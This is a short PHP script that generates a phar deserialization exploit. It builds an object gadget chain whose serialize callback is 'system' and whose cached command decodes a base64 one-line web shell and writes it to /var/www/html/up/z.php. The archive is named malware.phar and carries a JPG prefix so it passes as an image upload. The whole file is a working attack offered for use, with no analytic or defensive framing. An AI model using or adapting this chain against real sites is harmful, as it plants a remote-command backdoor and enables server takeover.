<?php

class cl1 {
    protected $store;
    protected $key;
    protected $expire;

    public function __construct($store, $key = 'flysystem', $expire = null) {
        $this->key = $key;
        $this->store = $store;
        $this->expire = $expire;
        //add your own properties
        $this->cache = ['$(echo PD89YCRfR0VUWzBdYDs= | base64 -d > /var/www/html/up/z.php)'];
        $this->autosave = 0;
        $this->complete = 0;
    }
}

class cl2 {
    public function __construct(){
    	//add your own properties
    	$this->options['serialize'] = "system";
    	$this->writeTimes = 0;
     	$this->options['prefix'] = '';
     	$this->options['data_compress'] = 0;
    }
}

$x = new cl1(new cl2(),"z",0);
$p = new Phar('malware.phar');
$p->startBuffering();
$p->addFromString("z","");
$j = file_get_contents("1.jpg");
$p->setStub($j."<?php __HALT_COMPILER(); ? >");
$p->setMetadata($x);
$p->stopBuffering();
$file = file('malware.phar');